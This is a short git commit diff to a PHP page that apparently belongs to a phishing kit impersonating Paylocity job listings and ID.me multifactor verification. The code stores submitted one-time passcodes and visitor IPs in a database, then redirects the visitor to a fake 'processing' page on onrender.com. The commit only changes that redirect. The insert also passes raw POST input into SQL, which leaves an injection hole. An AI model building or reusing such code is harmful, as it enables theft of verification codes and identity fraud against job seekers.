e685f8e1726174ca617f4d601052d8a3a7e11913
ghost-hub1 <37017254+ghost-hub1@users.noreply.github.com>
2025-02-07 01:33:06 +0100

    processing

--- public/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php
+++ public/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php
@@ -5,7 +5,7 @@ if ($_SERVER["REQUEST_METHOD"]=="POST"){
     $query = "INSERT INTO otpconfirm (otpconfirm,time,ip) VALUES ('$_POST[otpconfirm]',NOW(),'$_POST[ip]')";
     $result = pg_query($query);
 
- header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/verification_processing.html");
+ header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/processing.html");
 
 exit; 
 }
